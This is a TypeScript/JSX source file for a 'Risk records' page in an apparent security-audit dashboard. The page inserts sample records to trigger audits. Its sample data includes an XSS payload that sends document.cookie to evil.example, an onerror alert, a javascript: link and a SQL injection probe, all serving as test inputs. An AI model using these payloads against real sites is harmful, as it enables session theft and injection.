import { customElement, state } from "@yukino.js/lit-jsx";
import { AtomElement } from "@/components/base";
import { Icon } from "@/components/icon";
import { PageHeader, formatTime } from "@/components/ui";
import { api } from "@/api/client";
import {
  apiErrorMessage,
  recordsAtom,
  refreshRecords,
  showToast,
  store,
} from "@/store/atoms";

const samples: Array<{ title: string; content: string; source: string }> = [
  {
    title: "Malicious feedback sample",
    content:
      '<script>fetch("https://evil.example/steal?c="+document.cookie)</script> Great page <img src=x onerror=alert(1)>',
    source: "web-form",
  },
  {
    title: "Normal feedback sample",
    content:
      "The overall experience is smooth; please add dark-mode support, and make report exports faster.",
    source: "web-form",
  },
  {
    title: "Injection probe sample",
    content:
      'Search is broken: \' OR 1=1 -- and the page goes blank; also <a href="javascript:alert(2)">click me</a> pops up',
    source: "app-search",
  },
];

@customElement("records-page")
export class RecordsPage extends AtomElement {
  @state() private recordTitle = "";
  @state() private recordContent = "";
  @state() private source = "web-form";
  @state() private submitting = false;

  protected override setupWatches(): void {
    this.watch(recordsAtom);
  }

  protected override loadData(): void {
    refreshRecords().catch((err) => showToast("error", apiErrorMessage(err)));
  }

  private async submit(title: string, content: string, source: string) {
    if (this.submitting || !content.trim()) return;
    this.submitting = true;
    try {
      const resp = await api.createRecord({ title, content, source });
      showToast("success", `Record #${resp.record.id} inserted`);
      this.recordTitle = "";
      this.recordContent = "";
      await refreshRecords();
    } catch (err) {
      showToast("error", apiErrorMessage(err));
    } finally {
      this.submitting = false;
    }
  }

  render() {
    const { items } = store.get(recordsAtom);
    return (
      <div yukino-sentry-view="risk-records">
        <PageHeader
          title="Risk records"
          subtitle="Insert a row to trigger the enabled condition-task audits"
          actions={
            <button
              class="btn btn-ghost btn-sm gap-1 rounded-full"
              yukino-sentry-ev="records-refresh"
              yukino-sentry-msg="Refresh risk records"
              onClick={() => this.loadData()}
            >
              <Icon name="refresh-cw" class="h-3.5 w-3.5" />
              Refresh
            </button>
          }
        />

        <div class="grid grid-cols-1 gap-4 xl:grid-cols-5">
          <div class="card bg-base-100 ring-base-300/60 h-fit ring-1 xl:col-span-2">
            <div class="card-body gap-3 p-5">
              <div class="flex items-center gap-2 text-sm font-semibold">
                <Icon name="shield-alert" class="text-error h-4 w-4" />
                Insert record
              </div>

              <div class="flex flex-wrap gap-1.5">
                {samples.map((s, idx) => (
                  <button
                    class="btn btn-outline btn-xs rounded-full"
                    yukino-sentry-ev="records-insert-sample"
                    yukino-sentry-msg={s.title}
                    yukino-sentry-sample={String(idx + 1)}
                    yukino-sentry-source={s.source}
                    onClick={() => this.submit(s.title, s.content, s.source)}
                  >
                    Sample {idx + 1}: {s.title}
                  </button>
                ))}
              </div>

              <label class="flex flex-col gap-1.5">
                <div class="text-base-content/70 text-xs">
                  <span class="text-xs">Title</span>
                </div>
                <input
                  class="input input-sm w-full"
                  value={this.recordTitle}
                  onInput={(e: Event) =>
                    (this.recordTitle = (e.target as HTMLInputElement).value)
                  }
                />
              </label>
              <label class="flex flex-col gap-1.5">
                <div class="text-base-content/70 text-xs">
                  <span class="text-xs">Content</span>
                </div>
                <textarea
                  class="textarea min-h-32 w-full font-mono text-xs"
                  onInput={(e: Event) =>
                    (this.recordContent = (
                      e.target as HTMLTextAreaElement
                    ).value)
                  }
                >
                  {this.recordContent}
                </textarea>
              </label>
              <label class="flex flex-col gap-1.5">
                <div class="text-base-content/70 text-xs">
                  <span class="text-xs">Source</span>
                </div>
                <input
                  class="input input-sm w-full"
                  value={this.source}
                  onInput={(e: Event) =>
                    (this.source = (e.target as HTMLInputElement).value)
                  }
                />
              </label>
              <button
                class={`btn btn-primary btn-sm rounded-full ${this.submitting ? "loading" : ""}`}
                yukino-sentry-ev="records-insert"
                yukino-sentry-msg="Insert risk record and trigger condition tasks"
                yukino-sentry-source={this.source}
                onClick={() =>
                  this.submit(this.recordTitle, this.recordContent, this.source)
                }
              >
                Insert record
              </button>
            </div>
          </div>

          <div class="card bg-base-100 ring-base-300/60 ring-1 xl:col-span-3">
            <div class="card-body p-5">
              <div class="mb-1 flex items-center gap-2 text-sm font-semibold">
                <Icon name="database" class="text-primary h-4 w-4" />
                Recent inserts ({items.length})
              </div>
              <div class="flex flex-col gap-2">
                {items.map((r) => (
                  <div class="border-base-300 bg-base-100 rounded-xl border p-3">
                    <div class="flex items-center justify-between gap-2">
                      <div class="flex items-center gap-2 text-sm font-medium">
                        <span class="text-base-content/40 font-mono text-xs">
                          #{r.id}
                        </span>
                        <span>{r.title || "Untitled"}</span>
                        <span class="badge badge-ghost badge-xs">
                          {r.source}
                        </span>
                      </div>
                      <span class="text-base-content/50 text-[11px]">
                        {formatTime(r.created_at)}
                      </span>
                    </div>
                    <pre class="bg-base-200/70 text-base-content/80 mt-2 max-h-24 overflow-auto rounded-lg p-2 font-mono text-[11px] break-all whitespace-pre-wrap">
                      {r.content}
                    </pre>
                  </div>
                ))}
                {items.length === 0 ? (
                  <div class="text-base-content/50 py-10 text-center text-sm">
                    No records yet
                  </div>
                ) : null}
              </div>
            </div>
          </div>
        </div>
      </div>
    );
  }
}

declare global {
  interface HTMLElementTagNameMap {
    "records-page": RecordsPage;
  }
}
